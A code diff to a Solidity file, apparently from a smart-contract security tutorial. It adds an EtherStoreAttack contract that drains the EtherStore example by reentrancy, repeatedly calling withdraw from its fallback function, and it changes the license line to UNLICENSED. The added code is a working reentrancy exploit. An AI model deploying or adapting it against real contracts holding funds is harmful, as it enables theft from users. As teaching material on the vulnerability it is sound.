@@ -1,4 +1,4 @@
-// SPDX-License-Identifier: MIT
+// SPDX-License-Identifier: UNLICENSED
 pragma solidity >=0.4.22 <0.9.0;
 
 /*
@@ -51,7 +51,29 @@ contract EtherStore {
     }
 }
 
-// SPDX-License-Identifier: MIT
-pragma solidity >=0.4.22 <0.9.0;
+contract EtherStoreAttack {
+    EtherStore public etherStore;
 
+    constructor(address _etherStoreAddress) {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
+
+    // Fallback is called when EtherStore sends Ether to this contract.
+    fallback() external payable {
+        if (address(etherStore).balance >= 1 ether) {
+            etherStore.withdraw();
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        etherStore.deposit{value: 1 ether}();
+        etherStore.withdraw();
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
 // Code from Smart Contract Programmer
